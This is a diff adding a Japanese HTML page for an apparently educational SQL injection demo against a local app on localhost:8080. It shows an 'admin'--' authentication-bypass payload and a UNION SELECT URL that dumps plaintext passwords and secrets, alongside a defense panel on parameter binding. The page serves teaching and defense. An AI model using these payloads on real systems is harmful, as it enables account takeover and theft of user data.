@@ -1,0 +1,101 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <title>つなぐ 会員ログイン（偽）</title>
+  <style>
+    body { font-family: sans-serif; padding:40px 16px; background:#111; color:#eee; margin:0; }
+    h1 { color:#ff5252; text-align:center; }
+    .wrap { max-width:620px; margin:0 auto; }
+    .card { background:#1b1b1b; border:1px solid #333; border-radius:10px; padding:18px 20px; margin:16px 0; }
+    .card h3 { margin:0 0 10px; font-size:15px; }
+    label { display:block; font-size:13px; margin:10px 0 4px; color:#bbb; }
+    input { width:100%; padding:8px 10px; border-radius:6px; border:1px solid #444; background:#0d0d0d; color:#eee; box-sizing:border-box; }
+    button { margin-top:12px; background:#ff5252; color:#fff; border:none; border-radius:6px; padding:10px 18px; font-weight:bold; cursor:pointer; }
+    a.leak { color:#4fc3f7; word-break:break-all; font-size:13px; }
+    code { background:#0a140e; padding:1px 5px; border-radius:4px; color:#9be8b4; font-size:12px; }
+    .payload { color:#ffd54f; }
+
+    .panel { position: fixed; top:12px; right:12px; z-index:10; background:#fff; color:#333; border:1px solid #ccc; border-radius:10px; padding:12px 14px; text-align:left; font-size:13px; width:260px; box-shadow:0 2px 8px rgba(0,0,0,.3); }
+    .panel h2 { font-size:13px; margin:0 0 8px; color:#555; }
+    .panel label { display:flex; align-items:center; gap:6px; margin:6px 0; cursor:pointer; color:#333; }
+    .panel .hint { color:#888; font-size:11px; margin-top:4px; line-height:1.4; }
+    .panel hr { border:0; border-top:1px solid #eee; margin:10px 0; }
+    .status { font-weight:bold; border-radius:6px; padding:2px 8px; font-size:12px; }
+    .status.vuln { background:#ffe5e5; color:#c0392b; }
+    .status.safe { background:#e3f6e8; color:#1e7e34; }
+
+    .intent, .defense { display:none; border-radius:10px; padding:16px 18px; font-size:13px; line-height:1.7; margin:16px 0; }
+    .intent { background:#1e1e1e; border:1px solid #ff5252; }
+    .defense { background:#12241a; border:1px solid #2ecc71; }
+    body.show-intent .intent { display:block; }
+    body.defended .defense { display:block; }
+    .intent h3 { margin:0 0 8px; color:#ff5252; font-size:14px; }
+    .defense h3 { margin:0 0 8px; color:#2ecc71; font-size:14px; }
+    .intent b { color:#ffd54f; }
+    .intent ol { margin:0; padding-left:1.2em; }
+  </style>
+</head>
+<body>
+  <div class="panel">
+    <h2>🔎 学習用コントロール</h2>
+    <label><input type="checkbox" id="toggleIntent"> 攻撃者の狙い(シナリオ)を表示</label>
+    <div class="hint">入力をSQLに連結しているために成立する注入の筋書きを表示します。</div>
+    <hr>
+    状態: <span class="status vuln">脆弱（SQL連結）</span>
+    <hr>
+    <div class="hint">対策はプレースホルダ（パラメータバインド）。<code>app.ts</code> のコメント参照。</div>
+  </div>
+
+  <div class="wrap">
+    <h1>🔐 つなぐ 会員ログイン</h1>
+    <p style="text-align:center;color:#aaa">教育用デモ。各ボタンは標的(<code>localhost:8080</code>)の応答を新しいタブで開きます。</p>
+
+    <div class="card">
+      <h3>① 認証バイパス（成りすまし）</h3>
+      <p style="font-size:13px;color:#bbb">ユーザー名欄に <span class="payload">admin'--</span> を入れると、パスワード照合がコメントで無効化され、<b>パスワード不要で admin としてログイン</b>できます。</p>
+      <!-- 標的へ直接 POST。応答(JSON)を新しいタブで開いて ok:true, loggedInAs:admin を確認。 -->
+      <form action="http://localhost:8080/sns/login" method="POST" target="_blank">
+        <label>ユーザー名</label>
+        <input name="username" value="admin'--">
+        <label>パスワード</label>
+        <input name="password" value="(なんでもよい)">
+        <button type="submit">このユーザー名でログイン</button>
+      </form>
+    </div>
+
+    <div class="card">
+      <h3>② UNION でデータ窃取</h3>
+      <p style="font-size:13px;color:#bbb">会員検索に <span class="payload">' UNION SELECT ... --</span> を注入すると、本来見えない<b>平文パスワードや秘密メモ</b>まで吸い出せます。</p>
+      <a class="leak" target="_blank" rel="noopener"
+         href="http://localhost:8080/sns/members?name=%27%20UNION%20SELECT%20id%2C%20username%20%7C%7C%20%27%3A%27%20%7C%7C%20password%2C%20email%2C%20secret%20FROM%20members%20--">
+        http://localhost:8080/sns/members?name=' UNION SELECT id, username||':'||password, email, secret FROM members --
+      </a>
+    </div>
+
+    <div class="intent">
+      <h3>🎯 攻撃者の狙い（SQLインジェクション / Sony Pictures 2011）</h3>
+      <ol>
+        <li>ログインや検索の入力が <b>SQL文字列にそのまま連結</b>されていることに気づく。</li>
+        <li>ユーザー名に <b>admin'--</b> を入れ、パスワード条件をコメントアウトして<b>成りすまし</b>。</li>
+        <li>検索に <b>UNION SELECT</b> を注入し、<b>会員の平文パスワード・秘密メモを一括窃取</b>。</li>
+        <li>流出アカウントを他サービスへ使い回し（パスワードリスト型攻撃）してさらに被害が拡大する。</li>
+      </ol>
+    </div>
+
+    <div class="defense">
+      <h3>🛡 対策した場合（プレースホルダ）</h3>
+      <p><code>WHERE username = ? AND password = ?</code> のように<b>プレースホルダ</b>で値を渡せば、
+         入力は必ず「ただのデータ」として扱われ、<code>admin'--</code> や <code>UNION</code> は SQL として
+         解釈されません。文字列連結をやめることが根本対策です。</p>
+    </div>
+  </div>
+
+  <script>
+    const intent = document.getElementById('toggleIntent');
+    intent.addEventListener('change', () => {
+      document.body.classList.toggle('show-intent', intent.checked);
+    });
+  </script>
+</body>
+</html>
